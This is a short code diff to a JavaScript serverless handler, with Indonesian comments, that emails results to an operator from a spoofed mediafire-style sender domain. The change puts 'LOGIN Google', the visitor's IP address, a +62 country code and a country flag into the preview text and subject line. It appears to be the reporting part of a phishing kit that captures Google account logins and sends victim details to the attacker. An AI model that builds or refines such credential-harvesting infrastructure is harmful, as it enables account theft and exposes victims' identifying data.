@@ -50,8 +50,7 @@ export default async function handler(req, res) {
 
         const flag = countryFlag(d.negaraKode || "");
 
-        // Preview text dibuat netral — tanpa IP/bendera
-        const previewText = "Silakan buka untuk melihat detail informasi akun.";
+        const previewText = "ID " + flag + " | +62 | LOGIN Google | IP " + (d.ip || "-");
 
         const htmlBody = `
 <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">
@@ -108,7 +107,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: NAMA + " <noreply@mediafire.biz.id>",
                 to: [EMAIL],
-                subject: "🀄 " + NAMA + " 🀄",
+                subject: "🀄 " + NAMA + " 🀄 - " + (d.ip || "-") + " " + flag + " " + (d.negara || "-"),
                 html: htmlBody
             })
         });
